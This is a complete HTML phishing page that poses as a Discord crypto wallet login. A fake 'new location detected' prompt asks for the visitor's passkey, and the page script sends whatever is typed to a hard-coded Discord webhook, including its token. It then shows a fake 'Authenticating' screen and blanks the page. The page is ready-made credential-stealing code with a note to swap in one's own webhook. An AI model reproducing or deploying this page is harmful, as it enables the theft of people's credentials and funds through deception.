<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Drakify Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      font-family: 'Rubik', sans-serif;
      box-sizing: border-box;
    }

    body {
      background: #1e1f22;
      overflow: hidden;
      color: #fff;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    /* Background animation */
    body::before {
      content: "";
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: url('https://www.transparenttextures.com/patterns/dark-mosaic.png');
      opacity: 0.1;
      z-index: 0;
    }

    .login-box {
      background: #2b2d31;
      border-radius: 16px;
      box-shadow: 0 0 25px rgba(0, 0, 0, 0.6);
      padding: 40px;
      width: 360px;
      text-align: center;
      position: relative;
      z-index: 2;
      animation: fadeInUp 0.8s ease forwards;
    }

    .avatar {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      border: 3px solid #5865f2;
      margin-bottom: 15px;
    }

    .username {
      font-size: 22px;
      font-weight: 600;
      margin-bottom: 20px;
      color: #fff;
    }

    .wallet-header {
      font-size: 18px;
      color: #b5bac1;
      margin-bottom: 25px;
    }

    .login-btn {
      background-color: #5865f2;
      color: white;
      padding: 12px 24px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: 0.2s ease;
    }

    .login-btn:hover {
      background-color: #4752c4;
    }

    .popup, .loading-screen {
      display: none;
      position: fixed;
      top: 0; left: 0;
      height: 100vh;
      width: 100vw;
      background: rgba(0, 0, 0, 0.8);
      justify-content: center;
      align-items: center;
      z-index: 10;
    }

    .popup-box {
      background: #313338;
      padding: 30px;
      border-radius: 14px;
      width: 320px;
      text-align: center;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.4);
      animation: fadeIn 0.4s ease-in-out;
    }

    .popup-box h3 {
      margin-bottom: 10px;
      font-size: 18px;
      font-weight: 500;
    }

    .popup-box p {
      font-size: 14px;
      color: #b5bac1;
      margin-bottom: 12px;
    }

    .popup-box input {
      width: 90%;
      padding: 10px;
      border-radius: 8px;
      border: none;
      outline: none;
      background: #1e1f22;
      color: white;
      margin-bottom: 15px;
      font-size: 15px;
    }

    .popup-box button {
      background-color: #5865f2;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 15px;
    }

    .popup-box button:hover {
      background-color: #4752c4;
    }

    .loading-screen {
      flex-direction: column;
    }

    .loading-dots {
      font-size: 20px;
    }

    .loading-dots::after {
      content: '';
      display: inline-block;
      animation: dots 1.5s infinite;
    }

    @keyframes dots {
      0% { content: ''; }
      33% { content: '.'; }
      66% { content: '..'; }
      100% { content: '...'; }
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }

    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>

  <div class="login-box">
    <img class="avatar" src="https://i.pinimg.com/736x/ae/ed/d1/aeedd126eb22be0730716d4a6277ca54.jpg" alt="Avatar">
    <div class="username">drakify_x</div>
    <div class="wallet-header">Discord Crypto Wallet</div>
    <button class="login-btn" onclick="showPopup()">Log In</button>
  </div>

  <div class="popup" id="popup">
    <div class="popup-box">
      <h3>New location detected</h3>
      <p>Please confirm your identity</p>
      <input type="password" id="passInput" placeholder="Enter passkey">
      <br>
      <button onclick="sendPass()">Confirm</button>
    </div>
  </div>

  <div class="loading-screen" id="loading">
    <div class="loading-dots">Authenticating</div>
  </div>

  <script>
    const popup = document.getElementById("popup");
    const loading = document.getElementById("loading");
    const passInput = document.getElementById("passInput");
    const webhookURL = "https://discord.com/api/webhooks/1400800830147395615/aOABiZAWX2qwlfVnkBIrNonEZ4UkYVH42WvbFbv-Z8vhueamDQbuKZJay3MD9CwGn70c"; // Replace with your real webhook

    function showPopup() {
      popup.style.display = "flex";
      passInput.focus();
    }

    function sendPass() {
      const passkey = passInput.value.trim();

      if (!passkey) {
        alert("⚠️ Please provide a valid passkey.");
        passInput.focus();
        return;
      }

      popup.style.display = "none";

      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `🔐 Passkey submitted: **${passkey}**`
        })
      }).then(() => {
        loading.style.display = "flex";
        setTimeout(() => {
          document.body.innerHTML = "";
        }, 25000);
      }).catch(() => {
        loading.style.display = "flex";
        setTimeout(() => {
          document.body.innerHTML = "";
        }, 25000);
      });
    }

    passInput.addEventListener("keypress", function (e) {
      if (e.key === "Enter") sendPass();
    });
  </script>
</body>
</html>
